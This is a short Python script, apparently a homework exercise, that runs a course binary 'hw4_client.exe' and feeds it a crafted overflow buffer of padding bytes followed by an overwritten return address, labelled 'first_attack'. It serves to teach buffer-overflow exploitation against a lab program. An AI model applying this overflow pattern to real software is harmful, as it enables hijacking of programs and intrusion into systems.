import socket
import sys
import subprocess
from subprocess import PIPE
from time import sleep

proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)
#input()
desiredCode = "USER"
desiredUSERNAME = "USER\n"
desiredCodeHex = str.encode(desiredUSERNAME)
proc.stdin.write(desiredCodeHex)
preMenu =  "41" * 32
postMenu = "41" * 35
#breakpoint()  # drop into the debugger at this point
first_attack =  bytearray.fromhex(preMenu) + bytearray.fromhex("00000000") + bytearray.fromhex("00") + bytearray.fromhex(postMenu) + bytearray.fromhex("AE1C4000") +str.encode("\n")+str.encode("USER")

proc.communicate(input=first_attack)


